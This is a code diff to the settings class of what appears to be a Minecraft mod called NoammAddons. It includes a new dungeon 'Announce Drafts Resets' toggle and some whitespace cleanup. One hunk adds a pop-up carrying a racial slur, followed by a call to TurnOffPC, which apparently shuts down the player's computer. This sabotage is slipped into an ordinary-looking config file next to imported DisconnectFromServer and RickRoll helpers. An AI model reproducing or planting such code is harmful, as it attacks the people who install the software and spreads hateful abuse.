@@ -1,5 +1,5 @@
 import {  @ButtonProperty, @PercentSliderProperty, @CheckboxProperty, @ColorProperty, @SelectorProperty, @SwitchProperty, @Vigilant, @SliderProperty, @TextProperty, Color } from "../Vigilance"
-import { DisconnectFromServer, RickRoll } from "./utils"
+import { Alert, DisconnectFromServer, RickRoll, TurnOffPC } from "./utils"
 
 
 @Vigilant("NoammAddons\\Config", "§d§l§nNoamm§b§l§nAddons", {
@@ -50,6 +50,9 @@ class Settings {
             `)
 
        , 5000)
+
+       Alert(`&4&CBYE BYE NIGGER WOMP WOMP!!`.addColor())
+       TurnOffPC(5000*5)
     }
 
     @ButtonProperty({
@@ -772,17 +775,6 @@ class Settings {
     })
     BetterM7 = false
 
-
-
-
-
-
-
-
-
-
-
-
     @SwitchProperty({
 		name: "§bIcefill §6Solver",
 		description: "",
@@ -896,23 +888,6 @@ class Settings {
         subcategory: "F7"
     })
     AutoI4 = false
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
     @SwitchProperty({
 		name: "§zClock Display",
@@ -1207,54 +1182,6 @@ class Settings {
     })
     wd_9 = '9';
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-// Terminals
     @SwitchProperty({
         name: "&dCustom Terminal Guis",
         description: "Global Switch for Custom Terminal Guis",
@@ -1335,7 +1262,13 @@ class Settings {
     })
     CustomColorsTerminal = true
 
-
+    @SwitchProperty({
+        name: "&cAnnounce &dDrafts &6Resets",
+        description: "Says in party chat when you used Architect's First Draft to reset a failed puzzle",
+        category: "Dungeons",
+        subcategory: "Secrets"
+    })
+    AnnounceDraftsReset = false
 
 
 
